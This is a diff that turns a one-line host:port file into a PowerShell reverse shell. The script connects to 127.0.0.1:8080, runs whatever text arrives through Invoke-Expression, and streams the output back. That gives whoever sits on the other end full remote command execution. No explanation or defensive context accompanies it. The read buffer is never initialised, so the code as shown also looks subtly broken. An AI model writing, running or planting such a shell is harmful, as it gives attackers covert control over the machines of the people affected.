@@ -1,1 +1,18 @@
-127.0.0.1:8080
+$TCPClient = New-Object System.Net.Sockets.TCPClient('127.0.0.1', '8080')
+$Stream = $TCPClient.GetStream()
+
+$successMessage = ([text.encoding]::UTF8).GetBytes("Successfully connected.\n\n")
+$Stream.Write($successMessage, 0, $successMessage.Length)
+
+$currentDirectoryMessage = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + ' > ')
+$Stream.Write($currentDirectoryMessage, 0, $currentDirectoryMessage.Length)
+
+while (($bytesRead = $Stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
+    $receivedData = (New-Object System.Text.UTF8Encoding).GetString($buffer, 0, $bytesRead)
+    $output = (Invoke-Expression $receivedData 2>&1 | Out-String) + (Get-Location).Path + '! '
+    $outputBytes = ([text.encoding]::UTF8).GetBytes($output)
+    $Stream.Write($outputBytes, 0, $outputBytes.Length)
+    $Stream.Flush()
+}
+
+$TCPClient.Close()
